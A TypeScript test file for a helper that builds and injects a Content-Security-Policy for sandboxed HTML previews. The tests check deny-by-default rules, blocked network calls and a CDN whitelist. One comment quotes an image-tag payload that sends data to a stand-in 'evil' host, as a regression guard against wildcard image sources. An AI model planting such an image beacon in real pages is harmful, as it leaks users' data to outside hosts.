import { describe, it } from "node:test";
import assert from "node:assert/strict";
import {
  HTML_PREVIEW_CSP_ALLOWED_CDNS,
  buildHtmlPreviewCsp,
  wrapHtmlWithPreviewCsp,
} from "../../../src/utils/html/previewCsp";

describe("buildHtmlPreviewCsp", () => {
  it("defaults to the exported CDN whitelist", () => {
    const csp = buildHtmlPreviewCsp();
    for (const cdn of HTML_PREVIEW_CSP_ALLOWED_CDNS) {
      assert.ok(csp.includes(cdn), `CSP should include ${cdn}`);
    }
  });

  it("denies everything by default (default-src 'none')", () => {
    const csp = buildHtmlPreviewCsp();
    assert.ok(csp.includes("default-src 'none'"));
  });

  it("allows inline scripts alongside the CDN whitelist", () => {
    const csp = buildHtmlPreviewCsp();
    assert.ok(
      csp.includes("script-src 'unsafe-inline' https://cdn.jsdelivr.net"),
    );
  });

  it("blocks connect-src entirely (no phone-home)", () => {
    const csp = buildHtmlPreviewCsp();
    assert.ok(csp.includes("connect-src 'none'"));
  });

  it("allows images from self + CDN whitelist + data: and blob:", () => {
    const csp = buildHtmlPreviewCsp();
    assert.ok(
      csp.includes(
        "img-src 'self' https://cdn.jsdelivr.net https://unpkg.com https://cdnjs.cloudflare.com https://fonts.googleapis.com https://fonts.gstatic.com data: blob:",
      ),
    );
  });

  it("rejects the wildcard img-src policy to prevent image-based exfiltration", () => {
    const csp = buildHtmlPreviewCsp();
    // Explicit regression guard: `img-src *` would allow
    // `<img src="https://evil/?leak=...">` even with connect-src blocked.
    assert.ok(!/img-src \*/.test(csp));
  });

  it("accepts a custom CDN list", () => {
    const csp = buildHtmlPreviewCsp(["https://example.com"]);
    assert.ok(csp.includes("script-src 'unsafe-inline' https://example.com"));
    assert.ok(!csp.includes("jsdelivr"));
  });
});

describe("wrapHtmlWithPreviewCsp", () => {
  it("injects the meta tag into an existing <head>", () => {
    const html = `<!DOCTYPE html><html><head><title>x</title></head><body>x</body></html>`;
    const out = wrapHtmlWithPreviewCsp(html);
    assert.ok(
      out.includes(
        `<head><meta http-equiv="Content-Security-Policy" content="default-src 'none'`,
      ),
    );
    // Original <title> preserved right after the injected meta.
    assert.ok(out.includes(`"><title>x</title>`));
  });

  it("wraps a fragment in a synthetic full document when <head> is absent", () => {
    const out = wrapHtmlWithPreviewCsp("<p>just a fragment</p>");
    assert.ok(out.startsWith("<!DOCTYPE html><html><head>"));
    assert.ok(out.includes(`Content-Security-Policy`));
    assert.ok(out.includes("<body><p>just a fragment</p></body>"));
  });

  it("is case-insensitive against <HEAD>", () => {
    const html = `<!DOCTYPE html><html><HEAD></HEAD><body>x</body></html>`;
    const out = wrapHtmlWithPreviewCsp(html);
    assert.ok(out.includes(`<HEAD><meta http-equiv`));
  });
});
